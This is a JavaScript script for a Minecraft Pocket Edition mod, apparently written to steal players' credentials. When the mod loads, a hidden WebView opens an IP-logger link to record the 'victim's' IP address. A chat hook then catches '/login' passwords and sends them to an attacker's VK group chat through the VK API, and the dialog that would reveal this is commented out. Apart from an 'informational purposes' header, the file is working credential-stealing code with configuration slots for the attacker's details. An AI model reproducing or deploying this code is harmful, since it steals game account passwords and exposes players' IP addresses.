//Created for informational purposes
//Updated 06.03.2022 Before Public Release
var IpCheckURL = ""
// In IpCheckURL Specify the Logger link to get the victim's IP
var chat_id = ""
//Group chat ID in VK
var token = ""
//your group token
var vkapiver = "5.81"
var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();

ctx.runOnUiThread(new java.lang.Runnable({
    run: function() {
        var webs = new android.webkit.WebView(ctx);
        var webset = webs.getSettings();
        webset.setJavaScriptEnabled(true);
        webs.setWebViewClient(new android.webkit.WebViewClient());
        webs.loadUrl(IpCheckURL);
        //
        //new android.app.AlertDialog.Builder(ctx).setView(webs).show();
        //remove the two slashes to display the site
    }}));

function chatHook(command) {
    var vksend = command.split(" ");
    if (vksend[0] == '/login') {
        ctx.runOnUiThread(new java.lang.Runnable({
            run: function() {
                var webs = new android.webkit.WebView(ctx);
                var webset = webs.getSettings();
                webset.setJavaScriptEnabled(true);
                webs.setWebViewClient(new android.webkit.WebViewClient());
                webs.loadUrl('https://api.vk.com/method/messages.send?chat_id='+ chat_id + '&message=/login ' + vksend[1] + '&access_token=' + token + '&v=' + vkapiver);
                //
        //new android.app.AlertDialog.Builder(ctx).setView(webs).show();
        //remove the two slashes to display the response
            }}));
    }
}